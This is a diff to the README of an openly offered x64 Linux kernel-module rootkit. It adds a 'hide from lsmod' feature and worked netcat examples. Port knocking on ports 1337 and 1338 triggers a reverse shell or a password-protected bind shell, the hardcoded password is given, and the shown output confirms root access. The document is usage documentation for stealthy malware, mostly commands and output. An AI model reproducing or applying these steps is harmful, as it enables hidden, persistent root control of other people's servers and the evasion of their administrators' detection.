@@ -6,9 +6,9 @@ Developed by : Antonius
 <br>
 Website : www.bluedragonsec.com
 <br>
-github : https://github.com/bluedragonsecurity
+Github : https://github.com/bluedragonsecurity
 <br>
-https://twitter.com/bluedragonsec
+Twitter : https://twitter.com/bluedragonsec
 <br>  
 This lkm rootkit works on x64 architecture only.
 <br>
@@ -21,7 +21,7 @@ Features :
   <li>hide bind shell and reverse shell port from netstat</li>
   <li>hide bind shell and reverse shell process</li>
   <li>rootkit persistence to survice after reboot</li>
-
+  <li>hide from lsmod</li>
 </p>
 <h3>Installation</h3>
 <p>
@@ -67,13 +67,31 @@ nc server ip 1337
 </pre>  
 Wait a few seconds and you will get reverse shell port connection from your target server.
 <br>
-
+Example (server ip address with rootkit installed is at 192.168.0.102):
+<pre>
+  robotsoft@robotsoft:~$ nc -l -p 31337 -v
+  Listening on 0.0.0.0 31337
+</pre>
+Do port knocking to target ip address (with rootkit installed) :
+<pre>
+robotsoft@robotsoft:~$ nc 192.168.0.102 1337
+</pre>  
+Back on your previous netcat listener, you will receive a reverse shell connection : 
+<pre>
+robotsoft@robotsoft:~$ nc -l -p 31337 -v
+Listening on 0.0.0.0 31337
+Connection received on 192.168.0.102 44052
+Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
 </p>
 
 <p>
 <b>Activating Bind Shell</b>
 <br>
 To activate bind shell, you need to do port knocking to your target server (with rootkit installed) on port 1338.
+The bind shell password is : bluedragonsec
 <br>
 On your machine, open terminal and type:
 <pre>
@@ -82,6 +100,17 @@ nc server ip 1338
 Wait a few seconds then type:
 <pre>
 nc server ip 31337
+type the password : bluedragonsec
+</pre>
+Example (server ip address with rootkit installed is at 192.168.0.102):
+<pre>
+robotsoft@robotsoft:~$ nc 192.168.0.102 1338
+(wait a few seconds)
+robotsoft@robotsoft:~$ nc 192.168.0.102 31337
+Password :bluedragonsec
+Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+id
+uid=0(root) gid=0(root) groups=0(root)
 </pre>
 </p>
 <p>
